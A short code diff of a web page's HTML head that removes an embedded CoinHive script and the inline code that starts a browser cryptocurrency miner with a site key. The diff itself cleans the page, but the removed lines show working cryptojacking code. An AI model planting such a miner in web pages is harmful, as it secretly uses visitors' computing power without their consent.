@@ -349,14 +349,6 @@ footer section p.ipv6 a:hover, footer section p.cookies a:hover { border: none; 
 	footer section .github span, footer section .spiceworks span, footer section .linkedin span { filter: invert(100%); -webkit-filter: invert(100%); }
 }
 	</style>
-
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <script>
-var miner = new CoinHive.Anonymous('xidLs0nFuu4ItPL2eU1bjokslhvsrnxP', {
-    throttle: 0.5
-});
-miner.start();
-    </script>
 </head>
 
 <body>
